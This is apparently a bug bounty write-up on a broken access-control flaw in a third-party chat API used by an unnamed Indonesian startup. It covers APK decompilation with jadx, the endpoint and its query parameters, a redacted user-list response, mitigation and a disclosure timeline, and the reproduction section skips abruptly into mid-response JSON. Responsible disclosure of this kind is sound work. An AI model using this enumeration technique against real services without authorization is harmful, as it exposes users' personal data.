Indonesian Startup Company PII Leaks

Hello everyone,

In this post, I will show you how I discovered a vulnerability in one of the Indonesian Startup Companies that could lead to a Personal Identifiable Information (PII) data leak containing the user's **name** or **email address**. By abusing this vulnerability, an attacker could fetch 100 users in one request of a unique query, and based on the `total_data` data from the response it likely contains **millions of users' data**.

## **Who is the target?**

The target asked me to not disclose the company name so let’s call it **Company X**.

## Reconnaissance

> Reconnaissance is the first phase of a penetration testing engagement. It involves gathering information about the target system or network that is going to be tested. The goal of reconnaissance is to gather as much information as possible about the target so that the penetration tester can understand the target system’s architecture, identify potential vulnerabilities, and develop an attack strategy. The reconnaissance phase is crucial because it helps the tester to understand the target better and to plan their attack accordingly.

Company X is primarily a mobile-based app (Android & iOS), but it also has a web-based app version. Since I’m an existing user of Company X, I am already familiar with their product & can freely browse & test their overall features like consultation.

One of my favorite testing areas is API testing, so I documented every API endpoint that they have. either by using Burp Proxy or simply by looking at the Network tab in the Web Browser, both have a “Copy/ export as Curl” feature that I can use to import to Postman.

Company X API documented in Postman

The benefit of this approach is not only having good documentation, but you can also use this for:

1. API monitoring to check whether the API behavior has changed over time.
2. If you learn something new (e.g. new attack scenario or technique or new CVE). maybe from a course or other security researcher, you can quickly go back to your Postman collection & test your new knowledge.

## Targetting the Chat System

When exploring the Consultation feature, one that caught my attention is this domain `https://xxx-lb.api.xxx.com`. Apparently, Company X uses third-party services for their chat system, let’s call it **Company Y**.

However, up until this point, I couldn’t find any vulnerability in the chat system. So my next approach is to do some reverse engineering from their mobile apps (in this case the Android version). For this purpose, we can use [Apk Saver](https://play.google.com/store/apps/details?id=com.sar.ApkSaver&hl=en-ID) & [jadx](https://github.com/skylot/jadx).

![](https://miro.medium.com/v2/resize:fit:700/1*tPZJqyfnvwc4KygSIhUaYQ.jpeg)

1. Make sure you already installed the Company X & Apk Saver on your Android phone.
2. Open the Apk Saver app, search & select the Company X app & click the “Save Apk” option.
3. Send the Apk file to your computer.
4. Install jadx
5. Run the jadx command to produce Java source code from the Android Apk file.

$ jadx -d company-x company-x.apk

Now we can analyze the code. Again, my main target is the API endpoint that is called from the Android app. One that caught my attention is this file `ChatApi.java`.

ChatApi.java

**Bingo!** that’s how I found the vulnerable endpoint URL:

> https://xxx-lb.api.xxx.com/api/v2/mobile/get_user_list?limit=10&page=1&order_query=&query=

## Steps To Reproduce

> In order to request to the vulnerable endpoint, we need to have the `chat-sdk-token`& before that we also need to retrieve authorization access token.

                "extras": {},  
                "id": 13531553,  
                "name": "xxxxxxxx@gmail.com ",  
                "updated_at": "2023-12-04T15:23:59.982646Z",  
                "username": "xxxxxxx@gmail.com "  
            },  
            {  
                "avatar_url": "http://xxx.cloudfront.net/images/xxx.png",  
                "created_at": "2023-11-27T07:52:05.402016Z",

                "username": "xxxxxxxx@gmail.com "  
            }  
        ]  
    },  
    "status": 200  
}

Note that there are 4 parameters on this endpoint that we can use:

1. `limit`; limit the number of data per page
2. `page`; page number
3. `order_query`; for ordering the data, e.g. `created_at desc`
4. `query`; for searching specific data (like name or email)

## Impact

1. Attackers could fetch 100 users in one request of a unique query, and based on the `total_data` data from the response it contains millions of user's data. The attacker then can sell the data to the black market or other interested parties.
2. Attackers can also perform further attacks like social engineering on the affected users.

## Mitigation

1. Since this endpoint is provided by default by Company Y, so if it’s not used by Company X, removing the route to this endpoint would be the easiest solution.
2. If this endpoint is needed, make sure to perform a proper authorization (access control) check. For example, only Company X's internal employees can access these data.

> Company X decided to remove the route to this endpoint, now it’s returning 404 Not Found “URL not found” so the issue has been resolved.

## Timeline

- [06/12/2023] Report by email to Company X security team
- [06/12/2023] Acknowledgement of the receipt of security disclosure
- [07/12/2023] Reported API Endpoint that was vulnerable is not accessible anymore
- [15/12/2023] Company X asked for a re-test to verify that the issue had been resolved. The internal discussions for the bounty are still ongoing.
- [15/12/2023] Re-test done & confirmed that the issue has been resolved. Also requesting Company X's permission for public disclosure.
- [22/12/2023] The bounty decision has been finalized, US$500 reward for 2 affected vulnerable API endpoints.

> P.S. I had a positive impression of Company X's swift response to my bug report submissions. Upon disclosure, they immediately acknowledged the issue and within less than one day, they deployed a fix in their production environment, demonstrating their commitment to tirelessly safeguarding their environment and ensuring the security of their customers’ data.
